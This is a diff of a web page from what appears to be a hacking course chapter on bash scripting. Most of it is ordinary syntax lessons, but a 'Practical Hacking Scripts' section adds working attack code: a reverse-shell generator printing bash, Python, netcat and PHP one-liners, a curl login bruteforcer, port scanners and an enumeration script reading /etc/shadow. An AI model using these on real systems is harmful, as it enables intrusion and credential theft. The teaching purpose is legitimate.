+# Other options:
+#!/bin/sh        # POSIX shell (more portable)
+#!/usr/bin/env bash  # Find bash in PATH (most portable)
+#!/usr/bin/python3   # Python script
+
+# ==================== MAKING SCRIPTS EXECUTABLE ====================
+chmod +x script.sh    # Add execute permission
+./script.sh           # Run the script
+bash script.sh        # Or run with bash directly
+
+# ==================== VARIABLES ====================
+
+name="hacker"              # No spaces around =
+target_ip="192.168.1.1"    # Use descriptive names
+port_range="1-1000"
+
+echo "Hello, $name"        # Variables with $
+echo "Scanning ${target_ip}:${port_range}"  # Braces for clarity
+
+# Command substitution - store command output
 current_date=$(date)
-echo "Today is: $current_date"
+my_ip=$(hostname -I | awk '{print $1}')
+open_ports=$(nmap -p- $target_ip | grep open)
 
-# User input
-read -p "Enter target IP: " target_ip
-echo "Scanning $target_ip..."
-</code></pre>
-                    </div>
+# Read-only variables
+readonly API_KEY="secret123"
+API_KEY="new"  # Error! Can't change readonly
 
-                    <h3 style="color: #33d4ff; font-size: 1.4rem; margin: 2rem 0 1rem 0;">Conditionals</h3>
-                    <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; margin: 1.5rem 0;">
-                        <pre style="margin: 0; color: #00ff88; font-family: 'Courier New', monospace; font-size: 1rem; line-height: 1.8;"><code>#!/bin/bash
+# ==================== USER INPUT ====================
+
+read -p "Enter target IP: " target
+echo "You entered: $target"
+
+read -sp "Enter password: " password  # -s = silent (no echo)
+echo ""
+
+read -t 5 -p "Quick! Enter value (5 sec): " quick_value  # Timeout
+
+# ==================== SPECIAL VARIABLES ====================
+
+$0          # Script name
+$1, $2, $3  # Positional parameters (arguments)
+$#          # Number of arguments
+$@          # All arguments as separate words
+$*          # All arguments as single string
+$?          # Exit status of last command
+$$          # Current script's PID
+$!          # PID of last background command
+
+# Example:
+# ./script.sh target1 target2 target3
+# $0 = ./script.sh
+# $1 = target1
+# $2 = target2
+# $# = 3</div>
+
+            <h3>Conditionals and Logic</h3>
+            <div class="code"># ==================== IF STATEMENTS ====================
+
+if [ condition ]; then
+    # commands
+elif [ condition ]; then
+    # commands
+else
+    # commands
+fi
+
+# ==================== FILE TESTS ====================
 
 if [ -f "/etc/passwd" ]; then
-    echo "/etc/passwd exists"
+    echo "File exists!"
 fi
 
-if [ $USER == "root" ]; then
-    echo "Running as root"
-else
-    echo "Not root user"
+# Common file tests:
+[ -f file ]     # Regular file exists
+[ -d dir ]      # Directory exists
+[ -e path ]     # Anything exists
+[ -r file ]     # File is readable
+[ -w file ]     # File is writable
+[ -x file ]     # File is executable
+[ -s file ]     # File is not empty
+[ -L file ]     # File is symlink
+
+# ==================== STRING TESTS ====================
+
+if [ "$name" = "hacker" ]; then
+    echo "Welcome, hacker!"
 fi
 
-# Numeric comparisons
-if [ $age -gt 18 ]; then
-    echo "Adult"
+[ "$a" = "$b" ]     # Strings are equal
+[ "$a" != "$b" ]    # Strings not equal
+[ -z "$a" ]         # String is empty
+[ -n "$a" ]         # String is not empty
+
+# ==================== NUMERIC COMPARISONS ====================
+
+if [ $port -eq 22 ]; then
+    echo "SSH port!"
 fi
-</code></pre>
-                    </div>
 
-                    <h3 style="color: #33d4ff; font-size: 1.4rem; margin: 2rem 0 1rem 0;">Loops</h3>
-                    <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; margin: 1.5rem 0;">
-                        <pre style="margin: 0; color: #00ff88; font-family: 'Courier New', monospace; font-size: 1rem; line-height: 1.8;"><code>#!/bin/bash
+[ $a -eq $b ]    # Equal
+[ $a -ne $b ]    # Not equal
+[ $a -lt $b ]    # Less than
+[ $a -le $b ]    # Less than or equal
+[ $a -gt $b ]    # Greater than
+[ $a -ge $b ]    # Greater than or equal
 
-# For loop
-for i in {1..5}; do
+# ==================== LOGICAL OPERATORS ====================
+
+# AND
+if [ -f file ] && [ -r file ]; then
+    echo "File exists and is readable"
+fi
+
+# OR
+if [ $port -eq 80 ] || [ $port -eq 443 ]; then
+    echo "Web port"
+fi
+
+# NOT
+if [ ! -f file ]; then
+    echo "File does not exist"
+fi
+
+# ==================== CASE STATEMENTS ====================
+
+case $protocol in
+    http)
+        port=80
+        ;;
+    https)
+        port=443
+        ;;
+    ssh)
+        port=22
+        ;;
+    *)
+        port=0
+        echo "Unknown protocol"
+        ;;
+esac</div>
+
+            <h3>Loops and Iteration</h3>
+            <div class="code"># ==================== FOR LOOPS ====================
+
+# Basic syntax
+for item in list; do
+    # commands
+done
+
+# Loop through list
+for ip in 192.168.1.1 192.168.1.2 192.168.1.3; do
+    echo "Scanning $ip"
+done
+
+# Brace expansion (super useful!)
+for i in {1..10}; do
+    echo "Number: $i"
+done
+
+for ip in 192.168.1.{1..254}; do
+    ping -c 1 -W 1 $ip &>/dev/null && echo "$ip is up"
+done
+
+# C-style for loop
+for ((i=1; i<=100; i++)); do
     echo "Iteration $i"
 done
 
-# Loop through files
-for file in /etc/*.conf; do
-    echo "Config file: $file"
+# Loop through command output
+for file in $(ls *.txt); do
+    echo "Processing $file"
 done
 
-# While loop
-counter=1
-while [ $counter -le 5 ]; do
+# Loop through file lines
+while read line; do
+    echo "$line"
+done < /etc/passwd
+
+# ==================== WHILE LOOPS ====================
+
+counter=0
+while [ $counter -lt 10 ]; do
     echo "Count: $counter"
     ((counter++))
 done
-</code></pre>
-                    </div>
 
-                    <h3 style="color: #33d4ff; font-size: 1.4rem; margin: 2rem 0 1rem 0;">Practical Hacking Script Example</h3>
-                    <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; margin: 1.5rem 0;">
-                        <pre style="margin: 0; color: #00ff88; font-family: 'Courier New', monospace; font-size: 1rem; line-height: 1.8;"><code>#!/bin/bash
-# Simple port scanner
+# Infinite loop (useful for monitoring)
+while true; do
+    echo "Running..."
+    sleep 60
+done
 
-if [ $# -eq 0 ]; then
-    echo "Usage: $0 <target_ip>"
+# Read file line by line
+while IFS= read -r line; do
+    echo "Line: $line"
+done < file.txt
+
+# ==================== UNTIL LOOPS ====================
+
+until [ -f /tmp/signal ]; do
+    echo "Waiting for signal file..."
+    sleep 5
+done
+
+# ==================== LOOP CONTROL ====================
+
+break       # Exit the loop immediately
+continue    # Skip to next iteration</div>
+
+            <h3>Functions and Organization</h3>
+            <div class="code"># ==================== DEFINING FUNCTIONS ====================
+
+# Simple function
+scan_host() {
+    ping -c 1 -W 1 $1 &>/dev/null && echo "$1 is up" || echo "$1 is down"
+}
+
+# Call the function
+scan_host 192.168.1.1
+scan_host 192.168.1.2
+
+# Function with multiple parameters
+scan_port() {
+    local host=$1
+    local port=$2
+    timeout 1 bash -c "echo >/dev/tcp/$host/$port" 2>/dev/null
+    if [ $? -eq 0 ]; then
+        echo "[+] $host:$port is open"
+        return 0
+    else
+        echo "[-] $host:$port is closed"
+        return 1
+    fi
+}
+
+# Call with parameters
+scan_port 192.168.1.1 22
+scan_port 192.168.1.1 80
+
+# ==================== LOCAL VARIABLES ====================
+
+my_function() {
+    local my_var="only visible inside function"
+    global_var="visible everywhere"
+}
+
+# ==================== RETURN VALUES ====================
+
+is_alive() {
+    ping -c 1 -W 1 $1 &>/dev/null
+    return $?  # Return ping's exit code
+}
+
+if is_alive 192.168.1.1; then
+    echo "Host is up!"
+fi
+
+# ==================== CAPTURING OUTPUT ====================
+
+get_ip() {
+    hostname -I | awk '{print $1}'
+}
+
+my_ip=$(get_ip)
+echo "My IP is: $my_ip"</div>
+
+            <h3>Practical Hacking Scripts</h3>
+            <div class="code">#!/bin/bash
+# ==================== NETWORK SCANNER ====================
+
+echo "=== Network Scanner ==="
+echo "Scanning 192.168.1.0/24..."
+
+for ip in 192.168.1.{1..254}; do
+    ping -c 1 -W 1 $ip &>/dev/null && echo "[+] $ip is alive" &
+done
+wait
+echo "=== Scan Complete ==="
+
+# ==================== PORT SCANNER ====================
+#!/bin/bash
+
+target=$1
+start_port=${2:-1}
+end_port=${3:-1024}
+
+echo "Scanning $target ports $start_port-$end_port"
+
+for port in $(seq $start_port $end_port); do
+    timeout 1 bash -c "echo >/dev/tcp/$target/$port" 2>/dev/null
+    if [ $? -eq 0 ]; then
+        echo "[OPEN] Port $port"
+    fi
+done
+
+# ==================== PASSWORD BRUTEFORCER (EDUCATIONAL) ====================
+#!/bin/bash
+
+target=$1
+username=$2
+wordlist=$3
+
+while read password; do
+    response=$(curl -s -d "user=$username&pass=$password" $target/login)
+    if [[ ! "$response" =~ "failed" ]]; then
+        echo "[+] Found password: $password"
+        exit 0
+    fi
+done < "$wordlist"
+
+echo "[-] Password not found"
+
+# ==================== REVERSE SHELL GENERATOR ====================
+#!/bin/bash
+
+echo "Reverse Shell Generator"
+read -p "Your IP: " ip
+read -p "Your Port: " port
+
+echo ""
+echo "=== Bash ===" 
+echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
+echo ""
+echo "=== Python ===" 
+echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
+echo ""
+echo "=== Netcat ===" 
+echo "nc -e /bin/bash $ip $port"
+echo ""
+echo "=== PHP ===" 
+echo "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
+
+# ==================== ENUMERATION SCRIPT ====================
+#!/bin/bash
+
+echo "=== System Enumeration ==="
+echo "[*] Hostname: $(hostname)"
+echo "[*] Kernel: $(uname -a)"
+echo "[*] Current User: $(whoami)"
+echo "[*] User ID: $(id)"
+echo ""
+echo "[*] Network Interfaces:"
+ip a 2>/dev/null || ifconfig
+echo ""
+echo "[*] Listening Ports:"
+netstat -tuln 2>/dev/null || ss -tuln
+echo ""
+echo "[*] SUID Binaries:"
+find / -perm -4000 -type f 2>/dev/null
+echo ""
+echo "[*] World-Writable Files:"
+find / -perm -2 -type f 2>/dev/null | head -20
+echo ""
+echo "[*] Interesting Files:"
+ls -la /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null</div>
+
+            <h3>Error Handling and Best Practices</h3>
+            <div class="code"># ==================== EXIT CODES ====================
+
+# 0 = success, non-zero = failure
+exit 0      # Success
+exit 1      # Generic error
+exit 2      # Misuse of command
+
+# Check last command's exit code
+command
+if [ $? -eq 0 ]; then
+    echo "Command succeeded"
+else
+    echo "Command failed with code $?"
+fi
+
+# ==================== ERROR HANDLING ====================
+
+set -e          # Exit on any error
+set -u          # Exit on undefined variable
+set -o pipefail # Catch errors in pipes
+set -x          # Debug: print each command
+
+# Combined (put at top of scripts):
+set -euo pipefail
+
+# Or handle errors manually
+command || { echo "Error!"; exit 1; }
+command || exit 1
+
+# ==================== DEBUGGING ====================
+
+# Add -x to shebang
+#!/bin/bash -x
+
+# Or enable/disable in script
+set -x    # Enable debug
+# ... code ...
+set +x    # Disable debug
+
+# ==================== INPUT VALIDATION ====================
+
+if [ $# -lt 2 ]; then
+    echo "Usage: $0 <target> <port>"
     exit 1
 fi
 
-target=$1
-echo "Scanning $target for open ports..."
+# Validate IP format
+if [[ ! $1 =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+    echo "Invalid IP address"
+    exit 1
+fi
 
-for port in {20..25} {80..443}; do
-    timeout 1 bash -c "</dev/tcp/$target/$port" 2>/dev/null
-    if [ $? -eq 0 ]; then
-        echo "Port $port is OPEN"
-    fi
-done
-</code></pre>
-                    </div>
+# ==================== CLEANUP ====================
 
-                    <div style="background: rgba(255,200,0,0.15); padding: 1.5rem; border-radius: 10px; margin: 2rem 0; border-left: 4px solid #ffc800;">
-                        <h4 style="color: #ffc800; margin-bottom: 0.5rem;">🔥 Why This Matters for Hacking</h4>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin: 0;">
-                            Bash scripts automate reconnaissance, exploitation, and post-exploitation. Write scripts to scan networks, brute-force logins, enumerate users, exfiltrate data, maintain persistence. Every repetitive hacking task? Script it. Efficiency = more vulns found in less time.
-                        </p>
-                    </div>
+# Trap signals for cleanup
+cleanup() {
+    echo "Cleaning up..."
+    rm -f /tmp/tempfile
+    kill $background_pid 2>/dev/null
+}
 
-                    <div style="background: rgba(0,204,255,0.1); padding: 1.5rem; border-radius: 10px; margin: 2rem 0;">
-                        <h4 style="color: #00ccff; margin-bottom: 1rem;">🎯 Quick Check</h4>
-                        <ul style="font-size: 1.05rem; line-height: 1.9; margin: 0;">
-                            <li>What does <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">#!/bin/bash</code> mean?</li>
-                            <li>How do you make a script executable?</li>
-                            <li>What's the syntax for a for loop in bash?</li>
-                            <li>How do you capture command output in a variable?</li>
-                        </ul>
-                    </div>
+trap cleanup EXIT   # Run on script exit
+trap cleanup INT    # Run on Ctrl+C
+trap cleanup TERM   # Run on kill</div>
+
+            <div class="info-box">
+                <h4>Script Development Tips</h4>
+                <ul style="margin-top: 1rem;">
+                    <li><strong>Start simple:</strong> Get it working, then optimize</li>
+                    <li><strong>Test often:</strong> Run after each change</li>
+                    <li><strong>Comment everything:</strong> Future you will thank you</li>
+                    <li><strong>Use functions:</strong> Reusable, testable code</li>
+                    <li><strong>Handle errors:</strong> Expect things to fail</li>
+                    <li><strong>Validate input:</strong> Never trust user input</li>
+                    <li><strong>Use ShellCheck:</strong> shellcheck script.sh catches bugs</li>
+                </ul>
+            </div>
+
+            <div class="card-grid" style="margin-top: 3rem;">
+                <div class="card">
+                    <h4>📚 Practice Resources</h4>
+                    <ul style="margin-top: 1rem; font-size: 0.9rem;">
+                        <li>OverTheWire: Bandit - Learn bash through challenges</li>
+                        <li>HackTheBox - Real-world scripting scenarios</li>
+                        <li>PicoCTF - CTF challenges requiring scripts</li>
+                        <li>explainshell.com - Understand complex commands</li>
+                    </ul>
                 </div>
-
-                <!-- Topic 8: Networking & SSH -->
-                <div style="background: linear-gradient(135deg, rgba(255,107,107,0.15) 0%, rgba(200,50,50,0.15) 100%); padding: 3rem; border-radius: 20px; margin: 3rem 0; border: 2px solid rgba(255,107,107,0.3);">
-                    <h2 style="color: #ff6b6b; font-size: 1.8rem; margin-bottom: 1.5rem;">🌐 Topic 8: Networking & SSH — Remote Access Mastery</h2>
-                    
-                    <h3 style="color: #ff8585; font-size: 1.4rem; margin: 2rem 0 1rem 0;">Essential Networking Commands</h3>
-                    <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; margin: 1.5rem 0;">
-                        <pre style="margin: 0; color: #00ff88; font-family: 'Courier New', monospace; font-size: 1rem; line-height: 1.8;"><code># Network interfaces
-ip addr show  # Modern command
-ifconfig      # Legacy command
-
-# Routing table
-ip route show
-route -n
-
-# Active connections
-netstat -tuln   # All listening ports
-ss -tuln        # Modern alternative to netstat
-
-# DNS lookup
-nslookup example.com
-dig example.com
-host example.com
-
-# Ping
-ping -c 4 google.com
-
-# Traceroute
-traceroute google.com
-</code></pre>
-                    </div>
-
-                    <h3 style="color: #ff8585; font-size: 1.4rem; margin: 2rem 0 1rem 0;">SSH — Secure Shell</h3>
-                    <p style="font-size: 1.1rem; line-height: 1.8; margin-bottom: 1.5rem;">
-                        SSH is your <strong>remote access lifeline</strong>. Encrypted terminal sessions to remote machines.
-                    </p>
-                    <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; margin: 1.5rem 0;">
-                        <pre style="margin: 0; color: #00ff88; font-family: 'Courier New', monospace; font-size: 1rem; line-height: 1.8;"><code># Connect to remote server
-ssh user@192.168.1.100
-
-# Specify port
-ssh -p 2222 user@192.168.1.100
-
-# Copy files (SCP)
-scp file.txt user@server:/remote/path
-scp user@server:/remote/file.txt .
-
-# Copy directories
-scp -r /local/dir user@server:/remote/path
-
-# SSH key authentication (no password needed)
-ssh-keygen -t rsa -b 4096
-ssh-copy-id user@server
-ssh user@server  # Now passwordless
-</code></pre>
-                    </div>
-
-                    <h3 style="color: #ff8585; font-size: 1.4rem; margin: 2rem 0 1rem 0;">SSH Configuration</h3>
-                    <p style="font-size: 1.05rem; line-height: 1.8; margin-bottom: 1.5rem;">
-                        Edit <code style="background: rgba(0,0,0,0.4); padding: 0.2rem 0.5rem; border-radius: 5px;">/etc/ssh/sshd_config</code> for server settings:
-                    </p>
-                    <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; margin: 1.5rem 0;">
-                        <pre style="margin: 0; color: #00ccff; font-family: 'Courier New', monospace; font-size: 1rem; line-height: 1.8;"><code># Change port (security through obscurity)
-Port 2222
-
-# Disable root login
-PermitRootLogin no
-
-# Disable password authentication (key-only)
-PasswordAuthentication no
-
-# Restart SSH service after changes
-sudo systemctl restart sshd
-</code></pre>
-                    </div>
-
-                    <h3 style="color: #ff8585; font-size: 1.4rem; margin: 2rem 0 1rem 0;">Firewall (iptables/ufw)</h3>
-                    <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; margin: 1.5rem 0;">
-                        <pre style="margin: 0; color: #00ff88; font-family: 'Courier New', monospace; font-size: 1rem; line-height: 1.8;"><code># UFW (Uncomplicated Firewall) - easier interface
-sudo ufw status
-sudo ufw enable
-sudo ufw allow 22/tcp
-sudo ufw allow 80/tcp
-sudo ufw deny 23/tcp
-sudo ufw delete allow 80/tcp
-
-# iptables (more complex but powerful)
-sudo iptables -L          # List rules
-sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
-sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
-sudo iptables -A INPUT -j DROP  # Drop all other traffic
-</code></pre>
-                    </div>
-
-                    <div style="background: rgba(255,200,0,0.15); padding: 1.5rem; border-radius: 10px; margin: 2rem 0; border-left: 4px solid #ffc800;">
-                        <h4 style="color: #ffc800; margin-bottom: 0.5rem;">🔥 Why This Matters for Hacking</h4>
-                        <p style="font-size: 1.05rem; line-height: 1.8; margin: 0;">
-                            SSH is how you maintain access after exploitation. Weak SSH configs = easy entry. Look for default ports, password auth enabled, root login permitted. After gaining access, use SSH tunneling for pivoting. Understanding firewalls helps you bypass restrictions and exfiltrate data through allowed ports.
-                        </p>
-                    </div>
-
-                    <div style="background: rgba(0,204,255,0.1); padding: 1.5rem; border-radius: 10px; margin: 2rem 0;">
-                        <h4 style="color: #00ccff; margin-bottom: 1rem;">🎯 Quick Check</h4>
-                        <ul style="font-size: 1.05rem; line-height: 1.9; margin: 0;">
-                            <li>What command shows active network connections?</li>
-                            <li>How do you copy a file to a remote server?</li>
-                            <li>Why should you use SSH keys instead of passwords?</li>
-                            <li>What's the purpose of changing the SSH port?</li>
-                        </ul>
-                    </div>
-                </div>
-
-                <!-- Conclusion & Next Steps -->
-                <div style="background: linear-gradient(135deg, rgba(0,255,136,0.1) 0%, rgba(0,204,255,0.1) 100%); padding: 3rem; border-radius: 20px; margin: 3rem 0; border-left: 5px solid var(--primary-color);">
-                    <h2 style="color: var(--primary-color); font-size: 1.8rem; margin-bottom: 1.5rem;">🎓 You've Mastered Linux Fundamentals</h2>
-                    <p style="font-size: 1.15rem; line-height: 1.8; margin-bottom: 1.5rem;">
-                        You now understand Linux at a level most users never reach. You can navigate file systems blindfolded, manage permissions like a security guard, control processes like a conductor, and automate tasks like a DevOps engineer.
-                    </p>
-                    <p style="font-size: 1.15rem; line-height: 1.8; margin-bottom: 1.5rem;">
-                        <strong>But this is just the beginning.</strong>
-                    </p>
-                    <p style="font-size: 1.15rem; line-height: 1.8; margin-bottom: 1.5rem;">
-                        Real mastery comes from <strong>practice</strong>. Set up VMs. Break things. Fix them. Script everything. Try different distros. Challenge yourself to live entirely in the terminal for a week.
-                    </p>
-                    <p style="font-size: 1.15rem; line-height: 1.8;">
-                        In the next chapters, we'll use this Linux foundation to dive into <strong>networking protocols</strong>, <strong>web application attacks</strong>, and <strong>active exploitation</strong>. Every technique builds on what you learned here.
-                    </p>
-                    <div style="background: rgba(0,255,136,0.15); padding: 2rem; border-radius: 15px; margin: 2rem 0;">
-                        <h3 style="color: #00ff88; margin-bottom: 1rem;">🏆 Practice Challenges</h3>
-                        <ul style="font-size: 1.05rem; line-height: 1.9; margin: 0;">
-                            <li>Create a bash script that backs up important files daily</li>
-                            <li>Find all SUID binaries on your system</li>
-                            <li>Set up SSH key authentication to a remote server</li>
-                            <li>Write a script that monitors CPU usage and alerts when it's high</li>
-                            <li>Configure a firewall to only allow SSH and HTTP traffic</li>
-                            <li>Create a new user with limited sudo privileges</li>
-                        </ul>
-                    </div>
-                </div>
-
-                <div style="display: flex; gap: 2rem; margin-top: 3rem;">
-                    <a href="hacking-ch02.html" style="flex: 1; background: linear-gradient(135deg, rgba(0,204,255,0.2) 0%, rgba(138,43,226,0.2) 100%); padding: 2rem; border-radius: 15px; text-decoration: none; border: 2px solid rgba(0,204,255,0.4); transition: all 0.3s;">
-                        <div style="color: #00ccff; font-size: 0.9rem; margin-bottom: 0.5rem;">← PREVIOUS</div>
-                        <div style="color: #fff; font-size: 1.1rem; font-weight: 600;">Chapter 02</div>
-                    </a>
-                    <a href="hacking-ch04.html" style="flex: 1; background: linear-gradient(135deg, rgba(0,255,136,0.2) 0%, rgba(0,204,255,0.2) 100%); padding: 2rem; border-radius: 15px; text-decoration: none; border: 2px solid rgba(0,255,136,0.4); transition: all 0.3s; text-align: right;">
-                        <div style="color: #00ff88; font-size: 0.9rem; margin-bottom: 0.5rem;">NEXT →</div>
-                        <div style="color: #fff; font-size: 1.1rem; font-weight: 600;">Chapter 04</div>
-                    </a>
+                <div class="card">
+                    <h4>🔧 Essential Tools</h4>
+                    <ul style="margin-top: 1rem; font-size: 0.9rem;">
+                        <li>ShellCheck - Bash script linter</li>
+                        <li>vim/nano - Terminal text editors</li>
+                        <li>tmux/screen - Terminal multiplexer</li>
+                        <li>git - Version control your scripts</li>
+                    </ul>
                 </div>
             </div>
-        </div>
-    </section>
+        </section>
 
-    <script src="script.js"></script>
-    
-    <!-- Supabase Client & Auth -->
-    </body>
+        <div style="margin-top: 6rem; padding-top: 3rem; border-top: 1px solid var(--border); display: flex; justify-content: space-between;">
+            <a href="hacking-ch02.html" style="color: var(--text2); text-decoration: none;">← Chapter 02: Networking</a>
+            <a href="hacking-ch04.html" style="color: var(--text); text-decoration: none; font-weight: 600;">Next: Chapter 04 - Web Security →</a>
+        </div>
+    </main>
+
+    <script>
+        window.addEventListener('scroll', () => {
+            const winScroll = document.body.scrollTop || document.documentElement.scrollTop;
+            const height = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+            const scrolled = (winScroll / height) * 100;
+            document.getElementById('progress').style.width = scrolled + '%';
+        });
+
+        const sections = document.querySelectorAll('.section');
+        const sidebarLinks = document.querySelectorAll('.sidebar-link');
+
+        window.addEventListener('scroll', () => {
+            let current = '';
+            sections.forEach(section => {
+                const sectionTop = section.offsetTop;
+                if (scrollY >= (sectionTop - 150)) {
+                    current = section.getAttribute('id');
+                }
+            });
+
+            sidebarLinks.forEach(link => {
+                link.classList.remove('active');
+                if (link.getAttribute('href') === `#${current}`) {
+                    link.classList.add('active');
+                }
+            });
+        });
+    </script>
+</body>
 </html>
+
 
 
